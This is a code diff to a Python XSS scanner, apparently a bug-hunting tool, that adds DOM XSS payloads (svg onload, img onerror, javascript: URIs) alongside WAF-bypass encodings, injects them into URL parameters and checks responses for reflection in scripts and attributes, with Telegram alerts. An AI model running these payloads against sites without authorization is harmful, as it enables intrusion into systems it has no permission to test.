@@ -8,6 +8,7 @@ import time
 from bs4 import BeautifulSoup
 import concurrent.futures
 import sys
+import os
 
 TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
 TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
@@ -22,6 +23,17 @@ NORMAL_PAYLOADS = [
 WAF_BYPASS_PAYLOADS = [
     "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
     "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+]
+DOM_XSS_PAYLOADS = [
+    '"><svg onload=alert(1)>',
+    '"><img src=x onerror=alert(1)>',
+    'javascript:alert(1)',
+    '\'><script>alert(1)</script>',
+    '"><iframe src=javascript:alert(1)>',
+    '"><body onload=alert(1)>',
+    '"><input onfocus=alert(1) autofocus>',
+    '"><details open ontoggle=alert(1)>',
+    '"><video src=x onerror=alert(1)>',
 ]
 CRAWL_LIMIT = 200
 TIMEOUT = 5
@@ -63,15 +75,18 @@ def test_direct_url(url):
         return False
 
     reflection_found = False
+    dom_xss_found = False
     base, after_question = url.split('?', 1)
 
     if "=" in after_question:
         inject_point = url.find("=") + 1
 
-        for payload in NORMAL_PAYLOADS:
+        for payload in NORMAL_PAYLOADS + WAF_BYPASS_PAYLOADS + DOM_XSS_PAYLOADS:
             test_url = url[:inject_point] + urllib.parse.quote(payload)
+
             try:
                 res = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
+
                 if payload in res.text:
                     print(f"[+] Reflected XSS Found: {test_url} | Payload: {payload}")
                     results.append({
@@ -82,13 +97,44 @@ def test_direct_url(url):
                     })
                     send_telegram_alert("Reflected XSS (Direct Injection)", test_url)
                     reflection_found = True
+
+                soup = BeautifulSoup(res.text, "html.parser")
+
+                for script in soup.find_all("script"):
+                    if script.string and payload in script.string:
+                        print(f"[+] DOM XSS Found inside <script>: {test_url} | Payload: {payload}")
+                        results.append({
+                            "domain": urllib.parse.urlparse(url).netloc,
+                            "vuln_type": "DOM XSS (Script Block)",
+                            "vulnerable_url": test_url,
+                            "payload": payload
+                        })
+                        send_telegram_alert("DOM XSS (Script Block)", test_url)
+                        dom_xss_found = True
+
+                for tag in soup.find_all(True):
+                    for attr in tag.attrs:
+                        try:
+                            if payload in tag.attrs.get(attr, ""):
+                                print(f"[+] DOM XSS Found inside Attribute '{attr}': {test_url} | Payload: {payload}")
+                                results.append({
+                                    "domain": urllib.parse.urlparse(url).netloc,
+                                    "vuln_type": f"DOM XSS (Attribute {attr})",
+                                    "vulnerable_url": test_url,
+                                    "payload": payload
+                                })
+                                send_telegram_alert(f"DOM XSS (Attribute {attr})", test_url)
+                                dom_xss_found = True
+                        except Exception:
+                            continue
+
             except Exception:
                 pass
 
-    if not reflection_found:
-        print(f"[-] No reflected parameter found in {url}")
+    if not (reflection_found or dom_xss_found):
+        print(f"[-] No reflected or DOM XSS parameter found in {url}")
 
-    return reflection_found
+    return reflection_found or dom_xss_found
 
 def extract_links_and_forms(url):
     links = []
@@ -234,22 +280,26 @@ def process_domain(domain):
 
 def save_results():
     try:
-        try:
-            with open(RESULT_JSON, "r") as jf:
-                old_results = json.load(jf)
-        except (FileNotFoundError, json.JSONDecodeError):
-            old_results = []
+        full_results = []
 
-        full_results = old_results + results
+        if os.path.exists(RESULT_JSON):
+            try:
+                with open(RESULT_JSON, "r") as jf:
+                    old_data = json.load(jf)
+                    if isinstance(old_data, list):
+                        full_results.extend(old_data)
+            except (json.JSONDecodeError, FileNotFoundError):
+                pass
+
+        full_results.extend(results)
 
         with open(RESULT_JSON, "w") as jf:
             json.dump(full_results, jf, indent=4)
 
-        print(f"\n[+] Results saved to {RESULT_JSON}")
+        print(f"\n[+] Results successfully saved to {RESULT_JSON}")
 
     except Exception as e:
-        print(f"[!] Failed to save results: {e}")
-
+        print(f"[!] Error saving results: {e}")
 
 def main():
     print("\nXSS Auditor Pro by Aung Myat Thu [w01f]\n")
